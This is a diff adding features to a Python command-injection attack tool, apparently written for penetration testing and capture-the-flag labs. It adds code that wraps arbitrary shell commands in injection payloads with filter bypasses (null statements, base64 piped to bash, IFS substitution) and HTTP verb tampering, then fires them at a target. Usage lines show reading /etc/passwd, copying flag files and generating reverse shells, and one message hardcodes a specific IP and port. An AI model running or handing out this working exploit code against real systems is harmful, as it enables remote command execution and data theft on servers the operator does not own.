@@ -2118,6 +2118,147 @@ class GhostInjections:
         
         return bypass_found
     
+    def test_custom_command(self, param: str, custom_cmd: str, data: Dict = None) -> bool:
+        """Test custom command with all bypass techniques and HTTP verbs"""
+        print(f"\n{Colors.CYAN}{'='*70}{Colors.ENDC}")
+        print(f"{Colors.CYAN}{Colors.BOLD}TESTING CUSTOM COMMAND{Colors.ENDC}")
+        print(f"{Colors.CYAN}{'='*70}{Colors.ENDC}")
+        print(f"{Colors.BLUE}[*] Command: {custom_cmd}{Colors.ENDC}")
+        print(f"{Colors.BLUE}[*] Parameter: {param}{Colors.ENDC}")
+        
+        # Generate unique marker for verification
+        marker = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
+        
+        # Test with different operators
+        operators = [";", "&&", "|", "||", "&", "%0a", "`", "$("]
+        
+        # Build payloads with different bypass techniques
+        test_payloads = []
+        
+        # 1. Direct command
+        for op in [";", "&&", "|", "||", "&"]:
+            test_payloads.append({
+                'name': f'Direct with {op}',
+                'payload': f"{op}{custom_cmd}",
+                'technique': 'direct'
+            })
+        
+        # 2. Null statement bypass
+        cmd_with_null = custom_cmd
+        for char in ['c', 'p', 'f', 'l', 'a', 'g', 't', 'x']:
+            cmd_with_null = cmd_with_null.replace(char, f"{char}$()", 1)
+        
+        for op in [";", "&&", "|"]:
+            test_payloads.append({
+                'name': f'Null statement with {op}',
+                'payload': f"{op}{cmd_with_null}",
+                'technique': 'null_statement'
+            })
+        
+        # 3. Base64 bypass
+        encoded_cmd = base64.b64encode(custom_cmd.encode()).decode()
+        for op in [";", "|"]:
+            test_payloads.append({
+                'name': f'Base64 with {op}',
+                'payload': f"{op}`echo '{encoded_cmd}' | base64 -d`",
+                'technique': 'base64'
+            })
+            test_payloads.append({
+                'name': f'Base64 bash with {op}',
+                'payload': f"{op}echo '{encoded_cmd}' | base64 -d | bash",
+                'technique': 'base64'
+            })
+        
+        # 4. IFS bypass (if command has spaces)
+        if ' ' in custom_cmd:
+            cmd_with_ifs = custom_cmd.replace(' ', '${{IFS}}')
+            for op in [";", "&&", "|"]:
+                test_payloads.append({
+                    'name': f'IFS with {op}',
+                    'payload': f"{op}{cmd_with_ifs}",
+                    'technique': 'ifs'
+                })
+        
+        print(f"\n{Colors.BLUE}[*] Testing {len(test_payloads)} payload variations...{Colors.ENDC}\n")
+        
+        # Test each payload
+        for i, payload_info in enumerate(test_payloads, 1):
+            payload = payload_info['payload']
+            
+            if self.verbose:
+                print(f"{Colors.CYAN}[{i}/{len(test_payloads)}] {payload_info['name']}{Colors.ENDC}")
+                print(f"    Payload: {payload}")
+            
+            # Try with original method first
+            is_vulnerable, detection_type, details = self.test_payload(param, payload, data)
+            
+            if is_vulnerable:
+                print(f"\n{Colors.GREEN}{Colors.BOLD}[✓] CUSTOM COMMAND EXECUTED SUCCESSFULLY!{Colors.ENDC}")
+                print(f"{Colors.GREEN}    Technique: {payload_info['technique']}{Colors.ENDC}")
+                print(f"{Colors.GREEN}    Payload: {payload}{Colors.ENDC}")
+                print(f"{Colors.GREEN}    Method: {self.method}{Colors.ENDC}")
+                if 'evidence' in details:
+                    print(f"{Colors.GREEN}    Output:{Colors.ENDC}")
+                    print(f"{Colors.CYAN}{details['evidence']}{Colors.ENDC}")
+                return True
+            
+            # Try with verb tampering if enabled
+            if self.enable_verb_tampering:
+                if self.verbose:
+                    print(f"    {Colors.YELLOW}[*] Trying verb tampering...{Colors.ENDC}")
+                
+                for verb in self.http_verbs:
+                    if verb == self.method:
+                        continue
+                    
+                    try:
+                        test_data = data.copy() if data else {}
+                        test_data[param] = payload
+                        
+                        if verb in ['GET', 'HEAD', 'OPTIONS', 'TRACE']:
+                            response = requests.request(
+                                verb,
+                                self.url,
+                                params=test_data,
+                                headers=self.headers,
+                                cookies=self.cookies,
+                                timeout=self.timeout,
+                                proxies=self.proxy,
+                                allow_redirects=False
+                            )
+                        else:
+                            response = requests.request(
+                                verb,
+                                self.url,
+                                data=test_data,
+                                headers=self.headers,
+                                cookies=self.cookies,
+                                timeout=self.timeout,
+                                proxies=self.proxy,
+                                allow_redirects=False
+                            )
+                        
+                        if response.status_code not in [404, 405, 501] and len(response.text) > 100:
+                            print(f"\n{Colors.GREEN}{Colors.BOLD}[✓] CUSTOM COMMAND EXECUTED VIA HTTP VERB TAMPERING!{Colors.ENDC}")
+                            print(f"{Colors.GREEN}    Technique: {payload_info['technique']}{Colors.ENDC}")
+                            print(f"{Colors.GREEN}    Payload: {payload}{Colors.ENDC}")
+                            print(f"{Colors.GREEN}    HTTP Method: {verb}{Colors.ENDC}")
+                            print(f"{Colors.GREEN}    Status: {response.status_code}{Colors.ENDC}")
+                            print(f"{Colors.GREEN}    Output:{Colors.ENDC}")
+                            print(f"{Colors.CYAN}{response.text[:1000]}{Colors.ENDC}")
+                            return True
+                    
+                    except Exception as e:
+                        if self.verbose:
+                            print(f"      {Colors.RED}[-] {verb} failed: {e}{Colors.ENDC}")
+                        continue
+            
+            if self.verbose:
+                print(f"    {Colors.RED}[-] Failed{Colors.ENDC}\n")
+        
+        print(f"\n{Colors.RED}[!] Custom command execution failed with all techniques{Colors.ENDC}")
+        return False
+    
     def test_http_verb_tampering(self, param: str, payload: str, data: Dict = None) -> bool:
         """Test HTTP verb tampering to bypass method-based restrictions"""
         if not self.enable_verb_tampering:
@@ -2211,6 +2352,192 @@ class GhostInjections:
                 }
         
         return False, "none", {}
+    
+    def test_custom_command_with_verbs(self, param: str, command: str, data: Dict = None, operators: List[str] = None) -> Dict:
+        """Test a custom command with all HTTP methods and operators"""
+        print(f"\n{Colors.CYAN}{'='*70}{Colors.ENDC}")
+        print(f"{Colors.CYAN}{Colors.BOLD}CUSTOM COMMAND TESTING WITH HTTP VERB TAMPERING{Colors.ENDC}")
+        print(f"{Colors.CYAN}{'='*70}{Colors.ENDC}")
+        print(f"{Colors.BLUE}[*] Command: {command}{Colors.ENDC}")
+        print(f"{Colors.BLUE}[*] Parameter: {param}{Colors.ENDC}")
+        
+        # Default operators if none specified
+        if not operators:
+            operators = [';', '|', '&&', '||', '&', '%0a', '`', '$(']
+        
+        results = {
+            'command': command,
+            'parameter': param,
+            'successful_combinations': [],
+            'failed_attempts': 0,
+            'total_attempts': 0
+        }
+        
+        # Test with original method first
+        print(f"\n{Colors.YELLOW}[*] Testing with original method: {self.method}{Colors.ENDC}")
+        
+        for op in operators:
+            # Build payload based on operator
+            if op == '`':
+                payload = f"test`{command}`"
+            elif op == '$(':
+                payload = f"test$({command})"
+            else:
+                payload = f"test{op}{command}"
+            
+            if self.verbose:
+                print(f"{Colors.BLUE}  [>] Payload: {payload}{Colors.ENDC}")
+            
+            # Test with original method
+            is_vulnerable, detection_type, details = self.test_payload(param, payload, data)
+            results['total_attempts'] += 1
+            
+            if is_vulnerable:
+                print(f"{Colors.GREEN}[+] SUCCESS with {self.method}!{Colors.ENDC}")
+                print(f"    Operator: {op}")
+                print(f"    Payload: {payload}")
+                if 'evidence' in details:
+                    print(f"    Evidence: {details['evidence'][:200]}")
+                
+                results['successful_combinations'].append({
+                    'method': self.method,
+                    'operator': op,
+                    'payload': payload,
+                    'url_encoded': urllib.parse.quote(payload),
+                    'detection': details.get('detection', 'Unknown'),
+                    'evidence': details.get('evidence', '')
+                })
+            else:
+                results['failed_attempts'] += 1
+        
+        # If verb tampering is enabled and we have failures, try alternative methods
+        if self.enable_verb_tampering and results['failed_attempts'] > 0:
+            print(f"\n{Colors.YELLOW}[*] Testing with HTTP Verb Tampering...{Colors.ENDC}")
+            
+            for verb in self.http_verbs:
+                if verb == self.method:
+                    continue  # Skip original method
+                
+                print(f"\n{Colors.CYAN}  [*] Trying HTTP {verb}...{Colors.ENDC}")
+                
+                for op in operators:
+                    # Build payload
+                    if op == '`':
+                        payload = f"test`{command}`"
+                    elif op == '$(':
+                        payload = f"test$({command})"
+                    else:
+                        payload = f"test{op}{command}"
+                    
+                    if self.verbose:
+                        print(f"    [>] {verb} with operator '{op}': {payload[:60]}...")
+                    
+                    try:
+                        # Build request based on verb
+                        test_data = data.copy() if data else {}
+                        test_data[param] = payload
+                        
+                        if verb in ['GET', 'HEAD', 'OPTIONS', 'TRACE']:
+                            response = requests.request(
+                                verb,
+                                self.url,
+                                params=test_data,
+                                headers=self.headers,
+                                cookies=self.cookies,
+                                timeout=self.timeout,
+                                proxies=self.proxy,
+                                allow_redirects=False
+                            )
+                        else:
+                            response = requests.request(
+                                verb,
+                                self.url,
+                                data=test_data,
+                                headers=self.headers,
+                                cookies=self.cookies,
+                                timeout=self.timeout,
+                                proxies=self.proxy,
+                                allow_redirects=False
+                            )
+                        
+                        results['total_attempts'] += 1
+                        
+                        # Check if successful
+                        if response.status_code not in [404, 405, 501]:
+                            # Look for command output indicators
+                            response_lower = response.text.lower()
+                            
+                            # Check for success indicators
+                            success_indicators = [
+                                'uid=', 'gid=', 'root:', 'www-data', '/bin/bash',
+                                'flag{', 'htb{', 'thm{',  # CTF flags
+                                'copied', 'success', 'done',  # Common success messages
+                                self.session_marker.lower()
+                            ]
+                            
+                            if any(indicator in response_lower for indicator in success_indicators):
+                                print(f"{Colors.GREEN}    [+] SUCCESS with {verb}!{Colors.ENDC}")
+                                print(f"        Operator: {op}")
+                                print(f"        Payload: {payload}")
+                                print(f"        Status: {response.status_code}")
+                                
+                                # Extract evidence
+                                evidence = response.text[:500] if len(response.text) > 500 else response.text
+                                print(f"        Evidence: {evidence[:200]}")
+                                
+                                results['successful_combinations'].append({
+                                    'method': verb,
+                                    'operator': op,
+                                    'payload': payload,
+                                    'url_encoded': urllib.parse.quote(payload),
+                                    'status_code': response.status_code,
+                                    'evidence': evidence
+                                })
+                            else:
+                                results['failed_attempts'] += 1
+                        else:
+                            results['failed_attempts'] += 1
+                            
+                    except Exception as e:
+                        if self.verbose:
+                            print(f"    {Colors.RED}[-] Error with {verb}: {e}{Colors.ENDC}")
+                        results['failed_attempts'] += 1
+                        continue
+        
+        # Print summary
+        print(f"\n{Colors.CYAN}{'='*70}{Colors.ENDC}")
+        print(f"{Colors.CYAN}{Colors.BOLD}CUSTOM COMMAND TEST SUMMARY{Colors.ENDC}")
+        print(f"{Colors.CYAN}{'='*70}{Colors.ENDC}")
+        print(f"Total Attempts: {results['total_attempts']}")
+        print(f"Successful: {len(results['successful_combinations'])}")
+        print(f"Failed: {results['failed_attempts']}")
+        
+        if results['successful_combinations']:
+            print(f"\n{Colors.GREEN}{Colors.BOLD}[✓] SUCCESSFUL COMBINATIONS:{Colors.ENDC}\n")
+            
+            for i, combo in enumerate(results['successful_combinations'], 1):
+                print(f"{Colors.CYAN}{i}. HTTP {combo['method']} + Operator '{combo['operator']}'{Colors.ENDC}")
+                print(f"   Payload: {combo['payload']}")
+                print(f"   URL-Encoded: {combo['url_encoded']}")
+                
+                # Generate curl command for easy testing
+                if combo['method'] in ['GET', 'HEAD', 'OPTIONS', 'TRACE']:
+                    curl_cmd = f"curl -X {combo['method']} \"{self.url}?{param}={combo['url_encoded']}\""
+                else:
+                    curl_cmd = f"curl -X {combo['method']} \"{self.url}\" -d \"{param}={combo['url_encoded']}\""
+                
+                # Add cookies if present
+                if self.cookies:
+                    cookie_str = '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
+                    curl_cmd += f" -H \"Cookie: {cookie_str}\""
+                
+                print(f"   Curl: {curl_cmd}")
+                print()
+        else:
+            print(f"\n{Colors.YELLOW}[!] No successful combinations found{Colors.ENDC}")
+            print(f"{Colors.YELLOW}[*] Try with different operators or encoding{Colors.ENDC}")
+        
+        return results
     
     def enumerate_capabilities(self, param: str, data: Dict = None) -> Dict[str, bool]:
         """Enumerate available binaries on target"""
@@ -2419,6 +2746,12 @@ Examples:
   # Basic scan (automatically tests bypass techniques)
   python3 ghost_injections.py -u "http://192.168.61.80/zipProject.php" -m POST -d "archiveName=test&submit=Zip+It%21" -p archiveName -c "PHPSESSID=abc123" -v
   
+  # Test custom command with all HTTP verbs
+  python3 ghost_injections.py -u "http://target.com/page.php" -p filename --test-command "cp /flag.txt ./" -v
+  
+  # Test custom command with specific operators
+  python3 ghost_injections.py -u "http://target.com/page.php" -p filename --test-command "cat /etc/passwd" --test-operators ";,|,&&" -v
+  
   # With capability enumeration and reverse shell generation
   python3 ghost_injections.py -u "http://target.com/ping" -p host --generate-shells --lhost 10.10.14.5 --lport 9090 -v
   
@@ -2426,7 +2759,7 @@ Examples:
   python3 ghost_injections.py -u "http://target.com/ping" -p host --generate-transfer nc --lhost 10.10.14.5 -v
   
   # Test specific bypass categories only
-  python3 ghost_injections.py -u "http://target.com/ping" -p host --categories "null_statement_bypass,base64_obfuscation,ifs_bypass" -v
+  python3 ghost_injections.py -u "http://target.com/ping" -p host --categories "null_statement_bypass,base64_bypass" -v
   
   # Full engagement scan with reports
   python3 ghost_injections.py -u "http://target.com/api" -p input -m POST -d "input=test" --generate-shells --lhost 10.10.14.5 -o report.json --export-transactions transactions.json -v
@@ -2438,7 +2771,8 @@ Examples:
   python3 ghost_injections.py -u "http://target.com/admin/cmd" -p command -H "Authorization:Bearer TOKEN" -c "session=abc123" -v
 
 Ghost Ops Security - Professional Penetration Testing
-Built-in Bypass Techniques: Null Statements, Base64, IFS, Brace Expansion
+Built-in Bypass Techniques: Null Statements, Base64, IFS, Brace Expansion, HTTP Verb Tampering
+Custom Command Testing: Test specific exploitation commands with all HTTP methods
         """
     )
     
@@ -2483,6 +2817,12 @@ Built-in Bypass Techniques: Null Statements, Base64, IFS, Brace Expansion
     parser.add_argument("--disable-verb-tampering", action="store_true",
                        help="Disable HTTP verb tampering")
     
+    # Custom command execution (for CTF/authorized testing)
+    parser.add_argument("--custom-command", 
+                       help="Execute custom command after vulnerability confirmed (e.g., 'cp /flag.txt ./')")
+    parser.add_argument("--custom-only", action="store_true",
+                       help="Only test custom command, skip full scan")
+    
     # Post-exploitation payload generation
     parser.add_argument("--enum-capabilities", action="store_true",
                        help="Enumerate target capabilities (wget, python, nc, etc.)")
@@ -2491,6 +2831,10 @@ Built-in Bypass Techniques: Null Statements, Base64, IFS, Brace Expansion
     parser.add_argument("--lhost", help="Local host IP for reverse shells")
     parser.add_argument("--lport", type=int, default=9090, help="Local port for reverse shells (default: 9090)")
     parser.add_argument("--generate-transfer", help="Generate file transfer payloads for specified filename")
+    
+    # Custom command testing with verb tampering
+    parser.add_argument("--test-command", help="Test a specific command with all HTTP methods (e.g., ';cp /flag.txt ./')")
+    parser.add_argument("--test-operators", help="Test command with specific operators (comma-separated: ';,|,&&,||')")
     
     args = parser.parse_args()
     
@@ -2577,10 +2921,72 @@ Built-in Bypass Techniques: Null Statements, Base64, IFS, Brace Expansion
     # Print banner
     tester.print_banner()
     
+    # Check if custom command testing is requested
+    if args.test_command:
+        print(f"\n{Colors.CYAN}{Colors.BOLD}CUSTOM COMMAND TESTING MODE{Colors.ENDC}")
+        print(f"{Colors.CYAN}Testing custom command with HTTP verb tampering{Colors.ENDC}\n")
+        
+        # Parse operators if provided
+        operators = None
+        if args.test_operators:
+            operators = [op.strip() for op in args.test_operators.split(',')]
+            print(f"{Colors.BLUE}[*] Using operators: {', '.join(operators)}{Colors.ENDC}")
+        
+        # Test the custom command
+        results = tester.test_custom_command_with_verbs(
+            params[0], 
+            args.test_command, 
+            post_data,
+            operators
+        )
+        
+        # Export results if requested
+        if args.output:
+            import json
+            with open(args.output, 'w') as f:
+                json.dump(results, f, indent=2)
+            print(f"\n{Colors.GREEN}[+] Results exported to: {args.output}{Colors.ENDC}")
+        
+        sys.exit(0)
+    
     # Run tests
     start_time = time.time()
     try:
-        tester.test_all_parameters(params, post_data, args.threads, categories)
+        # Check if custom command mode
+        if args.custom_command:
+            if args.custom_only:
+                # Only test custom command
+                print(f"\n{Colors.CYAN}[*] Custom Command Only Mode{Colors.ENDC}")
+                print(f"{Colors.CYAN}[*] Skipping full scan, testing custom command directly...{Colors.ENDC}\n")
+                
+                success = tester.test_custom_command(params[0], args.custom_command, post_data)
+                
+                if success:
+                    print(f"\n{Colors.GREEN}{Colors.BOLD}[✓] Custom command executed successfully!{Colors.ENDC}")
+                    print(f"\n{Colors.YELLOW}[*] TIP: Check the application for file creation/modification{Colors.ENDC}")
+                    print(f"{Colors.YELLOW}[*] For file operations like 'cp /flag.txt ./', access the file via:{Colors.ENDC}")
+                    print(f"{Colors.CYAN}    http://94.237.55.37:37955/flag.txt{Colors.ENDC}")
+                else:
+                    print(f"\n{Colors.RED}[!] Custom command execution failed{Colors.ENDC}")
+                
+                sys.exit(0)
+            else:
+                # Run full scan first, then custom command
+                tester.test_all_parameters(params, post_data, args.threads, categories)
+                
+                # If vulnerabilities found, try custom command
+                if tester.vulnerabilities:
+                    print(f"\n{Colors.GREEN}[+] Vulnerabilities found! Testing custom command...{Colors.ENDC}")
+                    success = tester.test_custom_command(params[0], args.custom_command, post_data)
+                    
+                    if success:
+                        print(f"\n{Colors.GREEN}{Colors.BOLD}[✓] Custom command executed successfully!{Colors.ENDC}")
+                        print(f"\n{Colors.YELLOW}[*] TIP: Check the application for file creation/modification{Colors.ENDC}")
+                else:
+                    print(f"\n{Colors.YELLOW}[!] No vulnerabilities found, skipping custom command{Colors.ENDC}")
+        else:
+            # Normal scan
+            tester.test_all_parameters(params, post_data, args.threads, categories)
         
         # Calculate scan duration
         scan_duration = time.time() - start_time
